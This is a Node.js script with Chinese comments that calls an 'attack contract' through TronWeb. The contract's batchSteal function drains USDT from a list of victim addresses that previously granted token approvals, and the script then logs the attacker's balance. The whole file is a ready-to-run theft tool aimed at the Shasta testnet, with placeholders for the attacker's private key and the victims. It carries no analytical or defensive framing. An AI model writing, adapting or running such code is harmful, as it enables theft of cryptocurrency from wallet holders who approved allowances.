// batchStealTRC20.js
const TronWeb = require("tronweb");

// ========== 配置（已填入你的地址） ==========
const ATTACK_CONTRACT = "TVdbKFNVRJjYpdPHDxSoeLw7Tp5AmA11zh";   // 攻击合约地址
const TOKEN_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";       // Shasta 测试 USDT
const ATTACKER_PRIVATE_KEY = "你的收款钱包私钥";                    // ⚠️ 必须替换为收款地址 TYKsGMu19ACE4XZgU5NdYiFg1QXPkHG6zA 的私钥
// =========================================

const fullNode = "https://api.shasta.trongrid.io";
const solidityNode = "https://api.shasta.trongrid.io";
const eventServer = "https://api.shasta.trongrid.io";

// 受害者地址列表（手动添加已授权的地址）
const victims = [
    "受害者地址1",
    "受害者地址2"
    // 继续添加...
];

// ========== 主逻辑 ==========
const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, ATTACKER_PRIVATE_KEY);

const attackABI = [
    {
        "inputs": [
            {"name": "token", "type": "address"},
            {"name": "victims", "type": "address[]"}
        ],
        "name": "batchSteal",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

(async () => {
    const attackContract = await tronWeb.contract(attackABI, ATTACK_CONTRACT);
    console.log(`开始批量盗取，共 ${victims.length} 个地址`);
    const result = await attackContract.batchSteal(TOKEN_ADDRESS, victims).send();
    console.log("盗取交易hash:", result);
    
    const tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);
    const balance = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
    console.log("攻击者（收款地址）当前余额:", balance.toString());
})();
